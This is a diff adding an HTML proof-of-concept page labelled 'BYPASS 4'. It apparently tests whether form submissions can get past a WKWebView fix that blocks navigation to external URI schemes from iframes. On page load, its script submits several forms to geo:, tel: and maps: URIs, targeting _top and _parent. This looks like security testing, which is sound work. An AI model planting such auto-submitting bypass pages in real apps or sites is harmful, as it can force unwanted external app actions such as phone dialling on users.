@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head><title>.</title></head>
+<body>
+<!--
+  BYPASS 4: Form submission to URI scheme
+
+  Form submissions fire WKNavigationDelegate.decidePolicyFor with
+  navigationType = .formSubmitted
+
+  The original bug was triggered by navigationType = .other (JS navigation).
+  The fix might only check isMainFrame when navigationType is .other or .linkActivated.
+  Form submissions might slip through.
+
+  We also test targeting _top so the main frame receives the form navigation.
+-->
+
+<!-- Form targeting self (iframe) -->
+<form id="f1" action="geo:0,0" method="get"></form>
+
+<!-- Form targeting top frame -->
+<form id="f2" action="geo:0,0" method="get" target="_top"></form>
+
+<!-- Form targeting parent -->
+<form id="f3" action="tel:+1234567890" method="get" target="_parent"></form>
+
+<!-- POST form to scheme -->
+<form id="f4" action="geo:0,0" method="post" target="_top"></form>
+
+<!-- Form with maps scheme -->
+<form id="f5" action="maps:0,0" method="get" target="_top"></form>
+
+<script>
+  // Submit each form with staggered timing
+  setTimeout(function() { document.getElementById('f1').submit(); }, 200);
+  setTimeout(function() { document.getElementById('f2').submit(); }, 500);
+  setTimeout(function() { document.getElementById('f3').submit(); }, 800);
+  setTimeout(function() { document.getElementById('f4').submit(); }, 1100);
+  setTimeout(function() { document.getElementById('f5').submit(); }, 1400);
+</script>
+</body>
+</html>
